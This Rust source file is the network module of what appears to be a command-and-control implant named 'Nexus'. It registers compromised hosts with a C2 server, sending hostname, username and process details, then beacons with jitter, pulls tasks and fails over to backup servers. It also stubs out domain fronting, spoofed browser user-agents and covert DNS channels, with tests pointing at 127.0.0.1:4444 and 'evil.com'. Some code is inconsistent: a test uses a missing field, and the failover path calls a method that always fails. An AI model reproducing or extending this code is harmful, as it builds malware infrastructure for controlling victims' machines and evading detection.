use nexus_common::*;
use std::time::Duration;
use tokio::time::timeout;
use tonic::transport::{Channel, Endpoint};

// Include the generated gRPC code
pub mod nexus {
    pub mod v1 {
        tonic::include_proto!("nexus.v1");
    }
}
// Don't use wildcard import to avoid conflicts
use nexus::v1::{nexus_c2_client, RegistrationRequest, HeartbeatRequest, TaskRequest, SystemStatus};

pub struct NetworkClient {
    server_url: String,
    connection_timeout: Duration,
    request_timeout: Duration,
    channel: Option<Channel>,
}

impl NetworkClient {
    pub fn new(server_url: String) -> Self {
        Self {
            server_url,
            connection_timeout: Duration::from_secs(10),
            request_timeout: Duration::from_secs(15),
            channel: None,
        }
    }

    pub fn with_timeouts(mut self, connection_timeout: Duration, request_timeout: Duration) -> Self {
        self.connection_timeout = connection_timeout;
        self.request_timeout = request_timeout;
        self
    }

    /// Establish gRPC connection
    async fn ensure_connection(&mut self) -> Result<&Channel> {
        if self.channel.is_none() {
            let endpoint = Endpoint::from_shared(self.server_url.clone())
                .map_err(|e| NexusError::NetworkError(format!("Invalid endpoint: {}", e)))?
                .timeout(self.connection_timeout);

            let channel = timeout(
                self.connection_timeout,
                endpoint.connect()
            ).await
            .map_err(|_| NexusError::NetworkError("Connection timeout".to_string()))?
            .map_err(|e| NexusError::NetworkError(format!("gRPC connection failed: {}", e)))?;
            
            self.channel = Some(channel);
        }
        
        Ok(self.channel.as_ref().unwrap())
    }

    /// Register agent with C2 server
    pub async fn register_agent(&mut self, registration_data: &RegistrationData) -> Result<String> {
        let jitter = rand::random::<u64>() % 5 + 1;
        tokio::time::sleep(Duration::from_secs(jitter)).await;

        let channel = self.ensure_connection().await?;
        let mut client = nexus_c2_client::NexusC2Client::new(channel.clone());

        let request = RegistrationRequest {
            hostname: registration_data.hostname.clone(),
            os_type: registration_data.os_type.clone(),
            os_version: registration_data.os_version.clone(),
            ip_address: registration_data.ip_address.clone(),
            username: registration_data.username.clone(),
            process_id: registration_data.process_id,
            process_name: registration_data.process_name.clone(),
            architecture: registration_data.architecture.clone(),
            capabilities: registration_data.capabilities.clone(),
            public_key: "".to_string(), // TODO: Add public key support
        };

        let response = timeout(
            self.request_timeout,
            client.register_agent(tonic::Request::new(request))
        ).await
        .map_err(|_| NexusError::NetworkError("Registration timeout".to_string()))?
        .map_err(|e| NexusError::NetworkError(format!("Registration failed: {}", e)))?;

        let registration_response = response.into_inner();
        if registration_response.success {
            Ok(registration_response.agent_id)
        } else {
            Err(NexusError::NetworkError(format!("Registration failed: {}", registration_response.message)))
        }
    }

    /// Send heartbeat and get tasks
    pub async fn heartbeat(&mut self, agent_id: &str) -> Result<Vec<nexus::v1::Task>> {
        let jitter = rand::random::<u64>() % 3 + 1;
        tokio::time::sleep(Duration::from_secs(jitter)).await;

        let channel = self.ensure_connection().await?;
        let mut client = nexus_c2_client::NexusC2Client::new(channel.clone());

        // Send heartbeat
        let heartbeat_request = HeartbeatRequest {
            agent_id: agent_id.to_string(),
            status: Some(SystemStatus {
                cpu_usage: 0.0,
                memory_usage_mb: 0,
            disk_free_mb: 0,
                interfaces: vec![],
                running_processes: vec![],
            }),
            task_statuses: vec![],
        };

        let _heartbeat_response = timeout(
            self.request_timeout,
            client.heartbeat(tonic::Request::new(heartbeat_request))
        ).await
        .map_err(|_| NexusError::NetworkError("Heartbeat timeout".to_string()))?
        .map_err(|e| NexusError::NetworkError(format!("Heartbeat failed: {}", e)))?;

        // Get tasks
        let task_request = TaskRequest {
            agent_id: agent_id.to_string(),
            max_tasks: 10,
        };

        let task_response = timeout(
            self.request_timeout,
            client.get_tasks(tonic::Request::new(task_request))
        ).await
        .map_err(|_| NexusError::NetworkError("Get tasks timeout".to_string()))?
        .map_err(|e| NexusError::NetworkError(format!("Get tasks failed: {}", e)))?;

        let mut tasks = Vec::new();
        let mut task_stream = task_response.into_inner();
        
        while let Some(task) = task_stream.message().await
            .map_err(|e| NexusError::NetworkError(format!("Task stream error: {}", e)))? {
            tasks.push(task);
        }

        Ok(tasks)
    }

    /// Submit task result  
    pub async fn submit_task_result(&mut self, agent_id: &str, task_result: nexus::v1::TaskResult) -> Result<()> {
        let channel = self.ensure_connection().await?;
        let mut client = nexus_c2_client::NexusC2Client::new(channel.clone());

        let _response = timeout(
            self.request_timeout,
            client.submit_task_result(tonic::Request::new(task_result))
        ).await
        .map_err(|_| NexusError::NetworkError("Submit result timeout".to_string()))?
        .map_err(|e| NexusError::NetworkError(format!("Submit result failed: {}", e)))?;

        Ok(())
    }

    /// Legacy method for backward compatibility
    pub async fn send_message(&mut self, _encrypted_message: &str) -> Result<String> {
        // This method is kept for compatibility but should be replaced with specific gRPC calls
        Err(NexusError::NetworkError("Use specific gRPC methods instead of send_message".to_string()))
    }

    /// Send a message without expecting a response (fire and forget)
    pub async fn send_message_no_response(&mut self, _encrypted_message: &str) -> Result<()> {
        // This method is kept for compatibility but should be replaced with specific gRPC calls
        Err(NexusError::NetworkError("Use specific gRPC methods instead of send_message_no_response".to_string()))
    }

    /// Test connectivity to the C2 server
    pub async fn test_connection(&mut self) -> bool {
        match self.ensure_connection().await {
            Ok(_) => true,
            Err(_) => false,
        }
    }

    /// Get the configured server URL
    pub fn get_server_addr(&self) -> &str {
        &self.server_url
    }

    /// Update server URL (for domain fronting or server rotation)
    pub fn set_server_addr(&mut self, new_url: String) {
        self.server_url = new_url;
        self.channel = None; // Force reconnection
    }
}

/// HTTP-based communication client for domain fronting and stealth
pub struct HttpClient {
    server_url: String,
    user_agent: String,
    proxy: Option<String>,
    headers: std::collections::HashMap<String, String>,
}

impl HttpClient {
    pub fn new(server_url: String) -> Self {
        Self {
            server_url,
            user_agent: Self::generate_user_agent(),
            proxy: None,
            headers: std::collections::HashMap::new(),
        }
    }

    pub fn with_proxy(mut self, proxy: String) -> Self {
        self.proxy = Some(proxy);
        self
    }

    pub fn with_user_agent(mut self, user_agent: String) -> Self {
        self.user_agent = user_agent;
        self
    }

    pub fn add_header(mut self, key: String, value: String) -> Self {
        self.headers.insert(key, value);
        self
    }

    /// Send HTTP POST request with encrypted payload
    pub async fn send_http_message(&self, _encrypted_message: &str) -> Result<String> {
        // This is a placeholder implementation
        // In a real implementation, you would use reqwest or similar HTTP client
        // with proper domain fronting headers and SSL configuration
        
        // For now, return an error indicating HTTP is not implemented
        Err(NexusError::NetworkError("HTTP client not yet implemented".to_string()))
    }

    fn generate_user_agent() -> String {
        let user_agents = vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ];
        
        let index = rand::random::<usize>() % user_agents.len();
        user_agents[index].to_string()
    }
}

/// DNS-based communication for covert channels
pub struct DnsClient {
    domain: String,
    dns_server: Option<String>,
}

impl DnsClient {
    pub fn new(domain: String) -> Self {
        Self {
            domain,
            dns_server: None,
        }
    }

    pub fn with_dns_server(mut self, dns_server: String) -> Self {
        self.dns_server = Some(dns_server);
        self
    }

    /// Send data via DNS TXT record queries
    pub async fn send_dns_message(&self, _encrypted_message: &str) -> Result<String> {
        // Placeholder for DNS-based C2 communication
        // This would involve crafting DNS queries with embedded data
        Err(NexusError::NetworkError("DNS client not yet implemented".to_string()))
    }
}

/// Handles connection retry logic and failover
pub struct ConnectionManager {
    primary_client: NetworkClient,
    backup_servers: Vec<String>,
    max_retries: u32,
    retry_delay: Duration,
    current_server_index: usize,
}

impl ConnectionManager {
    pub fn new(primary_server: String) -> Self {
        Self {
            primary_client: NetworkClient::new(primary_server),
            backup_servers: Vec::new(),
            max_retries: 3,
            retry_delay: Duration::from_secs(30),
            current_server_index: 0,
        }
    }

    pub fn add_backup_server(mut self, server: String) -> Self {
        self.backup_servers.push(server);
        self
    }

    pub fn with_retry_config(mut self, max_retries: u32, retry_delay: Duration) -> Self {
        self.max_retries = max_retries;
        self.retry_delay = retry_delay;
        self
    }

    /// Send message with automatic failover and retry logic
    pub async fn send_message_with_failover(&mut self, encrypted_message: &str) -> Result<String> {
        let mut last_error = NexusError::NetworkError("No servers available".to_string());

        // Try primary server first
        for retry in 0..self.max_retries {
            match self.primary_client.send_message(encrypted_message).await {
                Ok(response) => return Ok(response),
                Err(e) => {
                    last_error = e;
                    if retry < self.max_retries - 1 {
                        tokio::time::sleep(self.retry_delay).await;
                    }
                }
            }
        }

        // Try backup servers if primary fails
        for (index, backup_server) in self.backup_servers.iter().enumerate() {
            let mut backup_client = NetworkClient::new(backup_server.clone());
            
            for retry in 0..self.max_retries {
                match backup_client.send_message(encrypted_message).await {
                    Ok(response) => {
                        // Update primary client to use this working server
                        self.primary_client.set_server_addr(backup_server.clone());
                        self.current_server_index = index + 1;
                        return Ok(response);
                    }
                    Err(e) => {
                        last_error = e;
                        if retry < self.max_retries - 1 {
                            tokio::time::sleep(self.retry_delay).await;
                        }
                    }
                }
            }
        }

        Err(last_error)
    }

    /// Check connectivity to all configured servers
    pub async fn check_all_servers(&mut self) -> Vec<(String, bool)> {
        let mut results = Vec::new();
        
        // Check primary server
        let primary_addr = self.primary_client.get_server_addr().to_string();
        let primary_ok = self.primary_client.test_connection().await;
        results.push((primary_addr, primary_ok));

        // Check backup servers
        for backup_server in &self.backup_servers {
            let mut backup_client = NetworkClient::new(backup_server.clone());
            let backup_ok = backup_client.test_connection().await;
            results.push((backup_server.clone(), backup_ok));
        }

        results
    }

    pub fn get_current_server(&self) -> String {
        if self.current_server_index == 0 {
            self.primary_client.get_server_addr().to_string()
        } else {
            self.backup_servers[self.current_server_index - 1].clone()
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_network_client_creation() {
        let client = NetworkClient::new("127.0.0.1:4444".to_string());
        assert_eq!(client.get_server_addr(), "127.0.0.1:4444");
    }

    #[tokio::test]
    async fn test_network_client_with_timeouts() {
        let client = NetworkClient::new("127.0.0.1:4444".to_string())
            .with_timeouts(Duration::from_secs(5), Duration::from_secs(10));
        
        assert_eq!(client.connection_timeout, Duration::from_secs(5));
        assert_eq!(client.read_timeout, Duration::from_secs(10));
    }

    #[tokio::test]
    async fn test_connection_manager() {
        let mut manager = ConnectionManager::new("127.0.0.1:4444".to_string())
            .add_backup_server("127.0.0.1:4445".to_string())
            .add_backup_server("127.0.0.1:4446".to_string());
        
        assert_eq!(manager.backup_servers.len(), 2);
        assert_eq!(manager.get_current_server(), "127.0.0.1:4444");
    }

    #[tokio::test]
    async fn test_http_client_user_agent() {
        let client = HttpClient::new("https://example.com".to_string());
        assert!(!client.user_agent.is_empty());
        assert!(client.user_agent.contains("Mozilla"));
    }

    #[tokio::test]
    async fn test_dns_client_creation() {
        let client = DnsClient::new("evil.com".to_string())
            .with_dns_server("8.8.8.8".to_string());
        
        assert_eq!(client.domain, "evil.com");
        assert_eq!(client.dns_server, Some("8.8.8.8".to_string()));
    }
}
